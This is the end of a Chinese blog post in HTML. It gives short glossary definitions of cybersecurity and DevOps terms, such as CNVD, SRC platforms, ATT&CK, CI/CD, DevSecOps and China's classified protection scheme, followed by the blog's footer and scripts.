+<h1 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h1><p>国家信息安全漏洞共享平台：<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>国家计算机应急响应中心（CNCERT维护）：<a target="_blank" rel="noopener" href="https://www.cert.orgh.ctmn/lpublish/main/index.html">https://www.cert.orgh.ctmn/lpublish/main/index.html</a></p>
+<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>一个公司为了应对各种安全事件所做的准备和事后采取的措施</p>
+<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><p>Security Response Center：企业的应急响应中心<br><a target="_blank" rel="noopener" href="http://0xsafe.org/">http://0xsafe.org/</a></p>
+<h1 id="公益SRC"><a href="#公益SRC" class="headerlink" title="公益SRC"></a>公益SRC</h1><p><a target="_blank" rel="noopener" href="https://www.vulbox.com/">https://www.vulbox.com/</a><br><a target="_blank" rel="noopener" href="https://src.sjtu.edu.cn/">https://src.sjtu.edu.cn/</a></p>
+<h1 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a>网络空间测绘</h1><p>网络空间资源收录</p>
+<p>网络空间搜索引擎：</p>
+<p><a target="_blank" rel="noopener" href="http://www.shodan.io/">www.shodan.io</a><br>fofa.so<br><a target="_blank" rel="noopener" href="http://www.zoomeye.org/">www.zoomeye.org</a></p>
+<h1 id="ATT-CK"><a href="#ATT-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h1><p>Adversarial Tactics, Techniques, and Common Knowledge<br>对抗战术、技术和通用知识（攻击者技战术的知识库）</p>
+<p>Mitre</p>
+<p>风险分析模型：收集威胁情报，模拟APT攻击</p>
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>Reverse</p>
+<p>把程序还原为源代码，分析程序的运行过程</p>
+<h1 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h1><p>Development+Operations<br>开发测试运维一体化</p>
+<h1 id="CICD"><a href="#CICD" class="headerlink" title="CICD"></a>CICD</h1><p>包括：</p>
+<p>持续集成（Continuous Integration）<br>持续交付（Continuous Delivery）<br>持续部署（Continuous Deployment）</p>
+<p>具体技术：</p>
+<p>Git代码管理<br>Jenkins版本管理<br>代码扫描<br>自动化测试</p>
+<h1 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h1><p>Development+Security+Operations<br>安全开发与运维</p>
+<h1 id="等保"><a href="#等保" class="headerlink" title="等保"></a>等保</h1><p>网络安全等级保护</p>
+<p>要求相关行业的单位和公司的信息系统必须进行定级，然后在公安机关备案，然后建设整改，然后由测评机构评级，并且持续维护和监督。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/12/20241012-05.html" rel="prev" title="PostgreSQL主从同步">
+                  <i class="fa fa-angle-left"></i> PostgreSQL主从同步
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Oliver King</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
